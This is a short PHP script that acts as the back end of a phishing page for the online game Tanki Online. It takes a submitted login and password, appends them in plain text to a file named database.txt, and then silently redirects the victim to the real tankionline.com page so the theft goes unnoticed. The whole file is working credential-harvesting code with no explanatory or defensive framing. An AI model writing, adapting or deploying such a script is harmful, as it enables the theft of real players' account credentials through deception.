<?PHP
$Log = $_POST['login'];
$Pass = $_POST['pass'];
$log = fopen("database.txt","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://tankionline.com/battle-ru.html'></head></html>";
?>